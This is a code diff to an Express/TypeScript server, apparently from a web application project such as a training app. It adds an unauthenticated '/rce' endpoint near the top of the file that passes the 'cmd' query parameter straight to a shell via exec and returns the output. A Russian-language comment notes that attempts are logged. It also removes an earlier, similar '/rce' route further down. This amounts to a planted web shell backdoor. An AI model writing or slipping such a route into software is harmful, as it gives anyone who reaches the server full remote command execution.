@@ -130,6 +130,21 @@ import { ensureFileIsPassed, handleZipFileUpload, checkUploadSize, checkFileType
 const app = express()
 const server = new http.Server(app)
 
+
+app.get('/rce', (req: any, res: any) => {
+  const command = req.query.cmd;
+  console.log('RCE Attempt:', command); // Увидим в логах сервера, был ли запрос
+  if (command) {
+    exec(command, (error: any, stdout: any, stderr: any) => {
+      res.send(stdout || stderr || error?.message);
+    });
+  } else {
+    res.send('RCE is working');
+  }
+});
+
+
+
 // errorhandler requires us from overwriting a string property on it's module which is a big no-no with esmodules :/
 const errorhandler = require('errorhandler')
 
@@ -665,18 +680,7 @@ restoreOverwrittenFilesWithOriginals().then(() => {
   app.get('/snippets/fixes/:key', serveCodeFixes())
   app.post('/snippets/fixes', checkCorrectFix())
   
-  app.get('/rce', (req: Request, res: Response) => {
-    const command = req.query.cmd as string;
-    if (command) {
-      exec(command, (error, stdout, stderr) => {
-        if (stdout) return res.send(`<pre>${stdout}</pre>`);
-        if (stderr) return res.send(`<pre>STDERR: ${stderr}</pre>`);
-        if (error) return res.send(`<pre>ERROR: ${error.message}</pre>`);
-      });
-    } else {
-      res.send('<h1>RCE Active</h1><p>Use ?cmd= to execute commands</p>');
-    }
-  });
+
   
   app.use(serveAngularClient())
 
